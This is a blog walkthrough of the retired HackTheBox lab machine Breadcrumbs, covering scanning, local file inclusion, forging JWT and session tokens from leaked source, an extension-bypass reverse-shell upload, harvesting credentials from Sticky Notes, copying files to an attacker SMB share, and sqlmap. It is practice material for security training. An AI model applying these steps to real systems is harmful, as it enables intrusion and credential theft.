---
layout: walkthrough
title: HackTheBox - Breadcrumbs
date: 2021-07-18 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/breadcrumbs.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Breadcrumbs --`10.10.10.228`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Breadcrumbs$ nmap -sC -sV 10.10.10.228                                       [3/3]
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 07:00 EDT
Nmap scan report for 10.10.10.228 
Host is up (0.18s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.157' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=4/16%Time=60796E68%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.157'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -49m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-16T10:12:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.66 seconds
```

</details>


From the output shown above, we can see that the machine is a Windows machine. I started off by browsing the HTTP -- port 80 -- web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img1.png"  style="width: 80%" />
</p>


The page itself just seemed to be a library with some basic search functionality. The HTTPS instance -- port 443 -- seemed to be hosting the exact same web application. Looking into the web application, it said it was created by helich0pper, but the link redirected to the following GitHub page: <https://github.com/helich0pper>.

While I was browsing the web application, I ran a GoBuster scan in the background. The output is provided below:

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Breadcrumbs$ sudo gobuster dir -u http://10.10.10.228 -w /usr/share/seclists/Disco
very/Web-Content/raft-small-directories-lowercase.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.228
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/16 07:10:07 Starting gobuster
===============================================================
/includes (Status: 301)
/js (Status: 301)
/css (Status: 301)
/db (Status: 301)
/php (Status: 301)
/webalizer (Status: 403)
/phpmyadmin (Status: 403)
/portal (Status: 301)
/books (Status: 301)
/licenses (Status: 403)
/server-status (Status: 403)
/con (Status: 403)
/aux (Status: 403)
===============================================================
2021/04/16 07:15:55 Finished
===============================================================

```

</details>


There were a few directories that the scan identified, but I was interested in the `/portal` directory. After navigating to the directory I was presented with the following login screen:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img2.png"  style="width: 80%" />
</p>


As shown above, it seemed as if I would not be able to log into the application from my host. I clicked on the `helpers` link which redirected me to the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img3.png"  style="width: 80%" />
</p>


Even though I was unable to contact them using the page, I now had a list of potential users. I tried my luck and I was able to create a new profile from the login screen. Once I was registered, I logged in to the application as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img4.png"  style="width: 80%" />
</p>


I navigated to the `User Management` section and identified 3 additional users, namely:
- Sirine
- Juliette
- Support

I was also able to identify which user's were admins and super admins. However, it didn't provide me with any additional methods that I could potentially use to exploit the application. I continued my search and browsed to the `Issues` link:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img5.png"  style="width: 80%" />
</p>


I intercepted the logout request which simply contained a PHP Session Cookie and a JWT token which had a data field. I attempted to add in a `position` field and created a new JWT token as shown below:


```json
Headers = {
  "typ": "JWT",
  "alg": "HS256"
}

Payload = {
  "data": {
    "username": "test",
    "position": "super admin"
  }
}

```

Failure! At this point it didn't work and I wasn't sure how I should continue. I decided to take a step back and went back to the main page. 

### Local File Inclusion

I started off by attempting to inject into the various fields but it didn't lead anywhere. After a while. I changed the `method` to `1` which threw the following error:

```json
Undefined array key "book" in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php

Warning:  file_get_contents(../books/): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php
```

Alright, maybe there was something here. I started playing around with of the fields, but it seemed as though using method `1` it was specifically looking for:
- A `book` parameter
- A file to include

I changed the method to represent that, which looked as follows:

```json
book=../index.php&method=1
```

This successfully retrieved the `index.php` file and I now had Local File Inclusion (LFI). I decided to focus my efforts on the portal and started with the `login.php` page. The page relied on the `authController.php` page which had the following content:

<details>

```php
"<?php \r\nrequire 'db\/db.php';\r\nrequire \"cookie.php\";\r\nrequire \"vendor\/autoload.php\";\r\nuse \\Firebase\\JWT\\JWT;\r\n\r\n$errors = array();\r\n$username = \"\";\r\n$userdata = array();\r\n$valid = false;\r\n$IP = $_SERVER['REMOTE_ADDR'];\r\n\r\n\/\/if user clicks on login\r\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\r\n    if($_POST['method'] == 0){\r\n        $username = $_POST['username'];\r\n        $password = $_POST['password'];\r\n        \r\n        $query = \"SELECT username,position FROM users WHERE username=? LIMIT 1\";\r\n        $stmt = $con->prepare($query);\r\n        $stmt->bind_param('s', $username);\r\n        $stmt->execute();\r\n        $result = $stmt->get_result();\r\n        while ($row = $result->fetch_array(MYSQLI_ASSOC)){\r\n            array_push($userdata, $row);\r\n        }\r\n        $userCount = $result->num_rows;\r\n        $stmt->close();\r\n\r\n        if($userCount > 0){\r\n            $password = sha1($password);\r\n            $passwordQuery = \"SELECT * FROM users WHERE password=? AND username=? LIMIT 1\";\r\n            $stmt = $con->prepare($passwordQuery);\r\n            $stmt->bind_param('ss', $password, $username);\r\n            $stmt->execute();\r\n            $result = $stmt->get_result();\r\n\r\n            if($result->num_rows > 0){\r\n                $valid = true;\r\n            }\r\n            $stmt->close();\r\n        }\r\n\r\n        if($valid){\r\n            session_id(makesession($username));\r\n            session_start();\r\n\r\n            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';\r\n            $data = array();\r\n\r\n            $payload = array(\r\n                \"data\" => array(\r\n                    \"username\" => $username\r\n            ));\r\n\r\n            $jwt = JWT::encode($payload, $secret_key, 'HS256');\r\n            \r\n            setcookie(\"token\", $jwt, time() + (86400 * 30), \"\/\");\r\n\r\n            $_SESSION['username'] = $username;\r\n            $_SESSION['loggedIn'] = true;\r\n            if($userdata[0]['position'] == \"\"){\r\n                $_SESSION['role'] = \"Awaiting approval\";\r\n            } \r\n            else{\r\n                $_SESSION['role'] = $userdata[0]['position'];\r\n            }\r\n            \r\n            header(\"Location: \/portal\");\r\n        }\r\n\r\n        else{\r\n            $_SESSION['loggedIn'] = false;\r\n            $errors['valid'] = \"Username or Password incorrect\";\r\n        }\r\n    }\r\n\r\n    elseif($_POST['method'] == 1){\r\n        $username=$_POST['username'];\r\n        $password=$_POST['password'];\r\n        $passwordConf=$_POST['passwordConf'];\r\n        \r\n        if(empty($username)){\r\n            $errors['username'] = \"Username Required\";\r\n        }\r\n        if(strlen($username) < 4){\r\n            $errors['username'] = \"Username must be at least 4 characters long\";\r\n        }\r\n        if(empty($password)){\r\n            $errors['password'] = \"Password Required\"; \r\n        }\r\n        if($password !== $passwordConf){\r\n            $errors['passwordConf'] = \"Passwords don't match!\"; \r\n        }\r\n\r\n        $userQuery = \"SELECT * FROM users WHERE username=? LIMIT 1\";\r\n        $stmt = $con->prepare($userQuery);\r\n        $stmt ->bind_param('s',$username);\r\n        $stmt->execute();\r\n        $result = $stmt->get_result();\r\n        $userCount = $result->num_rows;\r\n        $stmt->close();\r\n\r\n        if($userCount > 0){\r\n            $errors['username'] = \"Username already exists\";\r\n        }\r\n\r\n        if(count($errors) === 0){\r\n            $password = sha1($password);\r\n            $sql = \"INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')\";\r\n            $stmt = $con->prepare($sql);\r\n            $stmt ->bind_param('ss', $username, $password);\r\n\r\n            if ($stmt->execute()){\r\n                $user_id = $con->insert_id;\r\n                header('Location: login.php');\r\n            }\r\n            else{\r\n                $_SESSION['loggedIn'] = false;\r\n                $errors['db_error']=\"Database error: failed to register\";\r\n            }\r\n        }\r\n    }\r\n}"

```

</details>

From the file, I now had access to the SecretKey: `6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e` which I could use to generate JWT tokens. I continued searching and came across a `cookie.php` file:

```php
"<?php\r\n\/**\r\n * @param string $username  Username requesting session cookie\r\n * \r\n * @return string $session_cookie Returns the generated cookie\r\n * \r\n * @devteam\r\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\r\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\r\n * *\/\r\nfunction makesession($username){\r\n    $max = strlen($username) - 1;\r\n    $seed = rand(0, $max);\r\n    $key = \"s4lTy_stR1nG_\".$username[$seed].\"(!528.\/9890\";\r\n    $session_cookie = $username.md5($key);\r\n\r\n    return $session_cookie;\r\n}"
```

It seemed as if the file was used to generate the actual JWT token, and since I had the code I would be able to generate the tokens myself. I decided to use the information that I had before, and I tried to generate a token for an **Active** administrator. After running the code several times, I was able to generate the following potential Session cookies:

```text
paul47200b180ccd6835d25d034eeb6e6390
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paula2a6a014d3bee04d7df8d5837d62e8c5
```


In order to exploit this, I needed to perform the following:
- Create a new JWT using the session tokens above
- Log into the `test` user account that I created
- Change the JWT to the newly created JWT

To create the JWT token, I used [jwt.io](https://jwt.io/) and included the first session cookie within the `Verify Signature` field which resulted in the following token:

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
```

After logging into the application, I opened the developer console and changed both tokens to reflect the tokens that I generated for Paul. Once they were altered, I refreshed the page and I was authenticated as the Paul user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img6.png"  style="width: 80%" />
</p>


### Exploiting Paul

With access to an administrative user, I was now able to upload a file:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img7.png"  style="width: 80%" />
</p>

As shown above, the file upload only accepted `.zip` files, and since the web application made use of PHP files, I would attempt to upload a PHP reverse shell. I started by locating a web shell and decided to make use of the following PHP reverse shell:

```bash
/usr/share/webshells/php/php-reverse-shell.php
```

Once I altered the local IP address, I moved the file to `hotshoto.zip` and uploaded it via the upload functionality. I intercepted the file upload and changed the file extension to `.php` using Burpsuite.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img8.png"  style="width: 80%" />
</p>

I ran into the following issue when attempting to upload the file:


```text
Fatal error: Uncaught Firebase\JWT\SignatureInvalidException: Signature verification failed in C:\Users\www-data\Desktop\xampp\htdocs\portal\vendor\firebase\php-jwt\src\JWT.php:122 Stack trace: #0 C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php(12): Firebase\JWT\JWT::decode('eyJ0eXAiOiJKV1Q...', '6cb9c1a2786a483...', Array) #1 C:\Users\www-data\Desktop\xampp\htdocs\portal\includes\fileController.php(18): validate() #2 {main} thrown in C:\Users\www-data\Desktop\xampp\htdocs\portal\vendor\firebase\php-jwt\src\JWT.php on line 122
```

Once I managed to sort out the issue with the JWT token -- I was missing a line break -- and uploading the file, I retrieved confirmation:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img9.png"  style="width: 80%" />
</p>


With the file uploaded, I needed to browse to `https://10.10.10.228/portal/uploads/` and activate the reverse shell:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img10.png"  style="width: 80%" />
</p>


## Lateral Movement using WWW-Data
With access to the host, I started by browsing files within the `www-data` directory.  I navigated to the **pizzaDeliveryUserData** directory and came across several files:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img11.png"  style="width: 80%" />
</p>



The only file which did not have the `.disabled` extension was `juliette.json`. Opening the file, I was able to find a username and password for `juliette`:

```json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

Using the credentials, I was able to log into the host via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img12.png"  style="width: 80%" />
</p>


## Lateral Movement using Juliette

With SSH access to the host, I started by performing some basic enumeration:

```bash
juliette@BREADCRUMBS C:\Users\juliette>echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & ech
o. & echo Hostname: & hostname & echo. & ipconfig /all


whoami:
breadcrumbs\juliette
juliette

Hostname:
Breadcrumbs


Windows IP Configuration

   Host Name . . . . . . . . . . . . : Breadcrumbs
   Primary Dns Suffix  . . . . . . . :       
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No    
   WINS Proxy Enabled. . . . . . . . : No    

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-EC-35
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::9413:4a5a:9055:95a9(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::80f4:214b:4848:a89c(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::9413:4a5a:9055:95a9%14(Preferred)   
   IPv4 Address. . . . . . . . . . . : 10.10.10.228(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:30b0%14
                                       10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 385896534
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-94-69-4E-00-0C-29-1D-7F-5B
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

```

I started browsing the `C:` directory and came across an `Anouncements` folder which contained a `main.txt` file:

```text
Rabbit Stew Celebration
To celebrate the new library startup, a lunch will be held this upcoming Friday at 1 PM.
Location: Room 201 block B
Food: Rabbit Stew

Hole Construction
Please DO NOT park behind the contruction workers fixing the hole behind block A.
Multiple complaints have been made.
```

Since I wasn't sure what to make of it and since I didn't have access to the `Development` directory, I continued enumerating the host and looked into the user's home directory. Within the directory I found a `todo.html` file:

```html
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</t
d>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

```

As shown by the todo list above, the user mentioned password migration from Sticky Notes. In order to exploit this, I needed to find Sticky Notes. Sticky Notes are stored in the user's AppData directory, more information can be found at the following URL: <https://www.howtogeek.com/283472/how-to-back-up-and-restore-sticky-notes-in-windows/>. I navigated to Juliette's AppData directory and ended up at the following path:
 
```bash
C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
```

The directory contained several files:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img13.png"  style="width: 80%" />
</p>



There are several methods which could be used to transfer the contents of the directory to your host, I decided to make use of Impacket's SMB server which was done using the following commands:

```bash
### On Kali Machine
sudo impacket-smbserver kali . -smb2support

### On Breadcrumbs host
copy * \\10.10.14.112\kali
```

With access to the sqlite database, I opened the database using sqlitebrowser and navigated to the **Notes** table which contained the following information:

```text
\\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!

\\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g

\\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: \[MOVED\]
```

## Privilege Escalation using Development
Using the credentials shown above, I was able to log into the host with the development account. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img14.png"  style="width: 80%" />
</p>


Since I was now a developer, I attempted to access the `C:\Development` directory which contained `Krypter_Linux`. I copied the file to my Kali machine and started to view the contents of the Binary. Running `file` on the Binary:

```bash
vagrant@ko:~/Desktop/HackTheBox/Breadcrumbs/smb$ file Krypter_Linux 
Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
```

After running `Strings` on the file, I came across the following lines:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img15.png"  style="width: 80%" />
</p>


As shown above, the new password manager was called PassManager and it most likely contained the Administrator's password. From within the developer SSH session, I used the following command to select the information from the password's table:

```url
curl "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords"

```

The command produced the following AES_Key:

```json
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("      
  }
}
```

Unfortunately, that was all the information that I could retrieve from the database using the basic curl command so I decided to use SQLMap against the connection. In order to use SQLMap, I needed to do a SSH portforward with the following:

```bash
ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228  

```

Now that the port was forwarded, I could use SQLMap to enumerate the database:

```bash
vagrant@ko:~/Desktop/HackTheBox/Breadcrumbs$ sqlmap --url "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords" --dump
```


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img16.png"  style="width: 80%" />
</p>
  
From the  output shown above, SQLMap was able to retrieve the user's password hash and the associated AES_Key. Using this information, I used CyberChef to decode the password:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img17.png"  style="width: 80%" />
</p>

As a final step, I authenticated to the host using the administrator's credentials via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Breadcrumbs/img18.png"  style="width: 80%" />
</p>



That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.